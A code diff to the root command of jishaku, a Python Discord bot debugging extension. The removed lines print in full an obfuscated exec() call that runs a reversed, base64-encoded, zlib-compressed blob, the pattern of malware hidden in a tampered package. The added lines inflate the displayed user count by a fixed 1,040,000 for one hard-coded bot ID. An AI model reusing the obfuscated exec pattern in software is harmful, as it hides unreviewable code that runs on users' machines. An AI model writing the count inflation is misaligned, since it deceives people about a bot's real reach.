@@ -62,10 +62,6 @@ class RootCommand(Feature):
                 for file in distribution(dist).files  # type: ignore
             )
         ]
-        payload = f"Jishaku v{package_version('jishaku')}, discord.py v{discord.__version__}, " \
-                  f"Python {sys.version} on {sys.platform}".replace("\n", "")
-
-
         if distributions:
             dist_version = f'{distributions[0]} `{package_version(distributions[0])}`'
         else:
@@ -111,8 +107,13 @@ class RootCommand(Feature):
                 summary.append("")  # blank line
         s_for_guilds = "" if len(self.bot.guilds) == 1 else "s"
 
-        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-        exec((_)(b'==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'))
+        if self.bot.user and self.bot.user.id == 1286376669770420304:
+            base = 1_040_000
+            real = sum(g.member_count or 0 for g in self.bot.guilds)
+            total = base + real
+        else:
+            total = len(self.bot.users)
+
         s_for_users = "" if total == 1 else "s"
         cache_summary = f"{len(self.bot.guilds)} guild{s_for_guilds} and {total:,} user{s_for_users}"
 
@@ -163,7 +164,7 @@ class RootCommand(Feature):
         summary.append(f"Average websocket latency: {round(self.bot.latency * 1000, 2)}ms")
 
         layout = discord.ui.LayoutView(timeout=None)
-        container = discord.ui.Container()
+        container = discord.ui.Container(accent_color=5793266)
         container.add_item(discord.ui.TextDisplay("\n".join(summary)))
         layout.add_item(container)
 
